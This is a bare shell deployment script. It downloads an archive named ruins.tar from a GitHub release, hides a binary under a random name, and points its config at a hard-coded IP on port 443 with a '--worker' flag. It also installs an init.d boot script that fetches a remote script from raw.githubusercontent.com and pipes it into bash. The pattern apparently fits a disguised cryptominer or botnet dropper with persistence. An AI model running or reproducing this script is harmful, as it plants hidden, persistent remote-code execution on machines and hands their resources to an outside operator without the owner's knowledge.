cd /
wget https://github.com/cairnewa/forge/releases/download/v1.5.2/ruins.tar
tar -xvf ruins.tar
cd /ruins
variable1=$(< /dev/urandom tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
mv trace $variable1
sed -i "s/mongodb/${variable1} --worker ${variable1}/g" ./tools.sh
sed -i "s/host/20.163.170.215:443/g" ./tools.sh
cd /etc/init.d
echo "bash <(curl -s -L https://raw.githubusercontent.com/cairnewa/forge/main/statu.sh)" > site.sh
chmod a+x site.sh
update-rc.d site.sh defaults
rm -rf ruins.tar
cd /ruins
nohup ./tools.sh
ps -ef | grep ruins
